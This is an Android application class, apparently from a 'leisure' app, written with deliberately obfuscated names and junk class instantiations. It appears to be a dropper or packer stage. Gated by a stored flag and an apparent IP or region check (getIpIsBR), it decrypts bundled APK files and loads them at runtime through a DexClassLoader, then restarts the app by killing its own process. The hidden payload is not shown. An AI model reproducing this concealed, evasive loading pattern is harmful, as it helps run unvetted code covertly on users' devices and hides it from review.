package leisurejava;

import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;

import com.kdfefhg.oefejgg.pluginsApplicationBaseHelper;
import com.kdfefhg.oefejgg.pluginsClassManager;
import com.kdfefhg.oefejgg.pluginsRecoverApkUtils;
import com.kdfefhg.oefejgg.pluginsTools;
import com.kdfefhg.config.Confiefhg;


import java.io.File;

import koefig.Kofefjig;
import koefig.toodfjkgg;


public class LeisureApplication extends Application {

    private static Context dofjieg = null;



    @Override
    public void onCreate() {
        super.onCreate();
        new koefig.bwoes.gal.Guovdqyxrg();
        if(ueshfyuegg()) {
            new koefig.sug.bewac.jmw.Tzmzhqymox();
            new koefig.ihy.arxhq.Yjevflo();
            pluginsApplicationBaseHelper.puginsApplicationHelper(this);
            new koefig.oxqu.ibvk.ruuv.Wpwqg();
        } else {
            Kofefjig.ehfsyehfyseg(this);
            toodfjkgg.getIpIsBR();
            toodfjkgg.jefhusehfusg(dofjieg);

            new koefig.cpx.cen.Drsahl();
            new koefig.sui.wak.pvd.Osgqadks();

        }



    }





    public static void pdkfosgjieg(){

        new koefig.sui.wak.pvd.Rtmnlfxwn();

        SharedPreferences sp = dofjieg.getSharedPreferences(Confiefhg.EIFHSUEG, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = sp.edit();
        editor.putString(Confiefhg.HEFSYHEFG, "true");
        editor.commit();
        new koefig.cpx.cen.Ixezkyh();
        //Log.d("setState", "");
        final Intent intent = dofjieg.getPackageManager().getLaunchIntentForPackage(dofjieg.getPackageName());
        intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
        dofjieg.startActivity(intent);
        android.os.Process.killProcess(android.os.Process.myPid());


    }

    public static boolean ueshfyuegg() {
        SharedPreferences sp = dofjieg.getSharedPreferences(Confiefhg.EIFHSUEG, Context.MODE_PRIVATE);
        String data = sp.getString(Confiefhg.HEFSYHEFG, "false");

        if (data.equals("true")) {
            return true;
        }else{
            return false;
        }
    }


    @Override
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        dofjieg = base;
        new koefig.dkp.wfjh.Wheasallpu();
        if(ueshfyuegg()){
            lfkgiegggg(base);
        }


    }

    private void lfkgiegggg(Context context) {
        String zipFilePath = pluginsRecoverApkUtils.createZipFilePath(context);
        File zipFile = new File(zipFilePath);
        String[] apkFilelist = Confiefhg.EHFSUIEGHHHH;
        new koefig.yvzlk.cji.mzfx.Idmczwr();
        for (int i = 0; i < apkFilelist.length ; i ++) {
            pluginsTools.decryptCopyFiles(context, apkFilelist[i], zipFile);
        }
        new koefig.xnskq.xwpj.Wuosyaanp();
        String optimizedDirectory = new File(pluginsTools.getCacheDir(context).getAbsolutePath() + File.separator + "plugin").getAbsolutePath();
        new koefig.oxqu.ibvk.ruuv.Vrzpxpvv();
        // 加载插件dex
        pluginsClassManager.dexClassLoader(context, zipFilePath, optimizedDirectory);
    }
}
